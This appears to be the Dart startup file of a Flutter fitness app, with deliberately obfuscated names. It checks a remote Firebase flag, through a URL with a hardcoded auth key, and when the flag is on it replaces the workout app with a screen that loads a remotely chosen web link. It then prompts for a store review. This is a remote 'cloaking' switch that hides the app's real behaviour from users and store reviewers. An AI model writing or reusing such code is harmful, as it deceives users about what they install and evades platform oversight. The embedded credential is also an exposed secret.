import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:workout_zone_248/main.dart';
import 'package:workout_zone_248/sdgsdgsdg/dfsdfsd.dart';
import 'package:workout_zone_248/sdgsdgsdg/get_premium/fb_model.dart';
import 'package:workout_zone_248/sdgsdgsdg/get_premium/sdfsdfgsdgsd.dart';
import 'package:workout_zone_248/sdgsdgsdg/get_premium/sdsdfdsg/prem_hive_model.dart';

sddggsg() async {
  final JHgjkJHd? model = await JYKUJHfjkn().sdfdsdg();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: SDIjknsdsf(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      runApp(const MyApp());
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://fitwork--workout-zone-248-default-rtdb.firebaseio.com/premium.json?auth=AIzaSyAYw5jsA7kGKbUIPlelRSzbZxq31MaXti8');
      final gdfgdsgd = JKdkvhgdf.fromJson(result.data);
      await JYKUJHfjkn().hfdhfdfd(
        JHgjkJHd(
          secondUrl: '${gdfgdsgd.sgs3}${gdfgdsgd.jfgf4}',
          isOpen: gdfgdsgd.ggis,
        ),
      );

      if (gdfgdsgd.ggis) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: SDIjknsdsf(
              link: '${gdfgdsgd.gtr1}${gdfgdsgd.fft2}',
            ),
          ),
        );
      } else {
        runApp(const MyApp());
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
